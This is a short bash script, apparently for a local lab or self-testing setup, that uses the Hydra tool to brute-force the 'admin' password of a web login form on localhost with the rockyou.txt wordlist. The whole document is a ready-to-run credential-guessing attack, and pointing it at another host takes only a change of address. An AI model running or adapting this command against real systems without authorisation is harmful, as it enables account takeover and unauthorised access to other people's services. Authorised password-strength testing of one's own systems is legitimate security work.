#!/bin/bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    127.0.0.1 http-post-form \
    "/login:username=^USER^&password=^PASS^:F=login failed"
